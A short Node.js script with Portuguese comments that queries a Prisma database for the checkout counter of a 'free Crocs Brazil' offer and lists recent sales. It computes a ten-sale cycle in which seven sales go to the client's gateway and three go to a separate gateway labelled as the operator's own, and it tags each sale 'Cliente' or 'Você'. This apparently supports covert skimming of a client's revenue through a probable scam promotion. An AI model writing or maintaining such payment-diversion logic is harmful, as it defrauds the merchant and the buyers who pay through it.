// Verificar contador atual no banco de dados
const { PrismaClient } = require('./src/generated/prisma');

const prisma = new PrismaClient();

async function checkCounter() {
  try {
    console.log("🔍 Verificando contador atual no banco...\n");
    
    // Buscar o checkout da oferta
    const checkout = await prisma.checkout.findUnique({
      where: {
        offer: "crocs-brasil-gratis"
      }
    });
    
    if (checkout) {
      console.log("📊 === DADOS DO CHECKOUT ===");
      console.log(`ID: ${checkout.id}`);
      console.log(`Oferta: ${checkout.offer}`);
      console.log(`Último Checkout Cliente: ${checkout.lastClientCheckout || "Nenhum"}`);
      console.log(`Criado em: ${checkout.createdAt}`);
      console.log(`Atualizado em: ${checkout.updatedAt}`);
      
      // Calcular próximo número
      const nextCount = parseInt(checkout.lastClientCheckout || "0") + 1;
      const cycle = nextCount % 10;
      
      console.log("\n🎯 === PRÓXIMA VENDA ===");
      console.log(`Próximo número: ${nextCount}`);
      console.log(`Ciclo: ${cycle}/10`);
      
      if (cycle < 7) {
        console.log(`Gateway: AllowPay (CLIENTE)`);
        console.log(`Para cliente: SIM`);
      } else {
        console.log(`Gateway: BlackCat (SEU)`);
        console.log(`Para cliente: NÃO`);
      }
      
    } else {
      console.log("❌ Checkout não encontrado para a oferta 'crocs-brasil-gratis'");
      console.log("💡 Criando checkout inicial...");
      
      const newCheckout = await prisma.checkout.create({
        data: {
          myCheckout: "0",
          offer: "crocs-brasil-gratis",
          lastClientCheckout: "0"
        }
      });
      
      console.log("✅ Checkout criado com sucesso!");
      console.log(`ID: ${newCheckout.id}`);
    }
    
    // Verificar vendas existentes
    console.log("\n📈 === VENDAS EXISTENTES ===");
    const sales = await prisma.sale.findMany({
      where: {
        offer: {
          name: "Crocs Brasil - Promoção Grátis"
        }
      },
      orderBy: {
        createdAt: 'desc'
      },
      take: 5
    });
    
    if (sales.length > 0) {
      console.log(`Total de vendas encontradas: ${sales.length}`);
      sales.forEach((sale, index) => {
        console.log(`${index + 1}. ${sale.customerName} - R$ ${sale.amount} - ${sale.toClient ? 'Cliente' : 'Você'} - ${sale.createdAt.toLocaleString()}`);
      });
    } else {
      console.log("Nenhuma venda encontrada ainda");
    }
    
  } catch (error) {
    console.error("❌ Erro ao verificar contador:", error);
  } finally {
    await prisma.$disconnect();
  }
}

checkCounter();
